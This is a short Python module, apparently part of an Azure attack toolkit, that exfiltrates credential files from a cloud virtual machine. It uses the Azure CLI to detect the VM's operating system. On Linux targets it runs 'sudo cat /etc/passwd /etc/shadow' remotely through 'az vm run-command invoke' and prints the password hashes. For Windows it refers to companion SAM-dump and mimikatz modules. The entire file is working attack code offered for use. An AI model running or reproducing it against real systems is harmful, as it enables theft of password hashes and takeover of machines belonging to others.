import subprocess
import json

def start(args):
	
	help_str = "usage:\n\texec exfil_passwd_shadow -rgrp resource-group -vm_name vm_name ---> will exfiltrate passwd and shadow files from target vm"

	if(len(args) < 1):
		print(help_str)
		return

	if(args[0][0] == "?"):
		print(help_str)
		return
		
	if "-rgrp" not in args[0] or "-vm_name" not in args[0]:
		print("incorrect cmd parameters")
		print(help_str)
		return

	grp_ind = args[0].index("-rgrp")
	rgrp = args[0][grp_ind+1]

	name_ind = args[0].index("-vm_name")
	vm_name = args[0][name_ind+1]

	print("[+] getting vm OS type... [+]")
	
	shell_stuff = subprocess.run(['az', 'vm', 'show', '-n', vm_name, '-g', rgrp, '--query', '{os_type:storageProfile.osDisk.osType}'], stdout=subprocess.PIPE)
	shell_json_obj = json.loads(shell_stuff.stdout.decode('utf-8'))

	os_type = shell_json_obj['os_type']
	

	if(os_type == "Windows"):
		print("[-] detected Windows OS, try to use exfil_samdump or exfil_mimikatz_dump modules for this VM [-]")
		return
	else:	
		print("[+] exfiltrating... [+]")	
		cmd = "sudo cat /etc/passwd /etc/shadow "
		val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vm_name, '--command-id', 'RunShellScript', '--scripts', cmd, '--query', 'value[].message'], stdout=subprocess.PIPE)
		val_json = json.loads(val.stdout.decode('utf-8'))
		print(val_json[0])
		print("[+] done! [+]")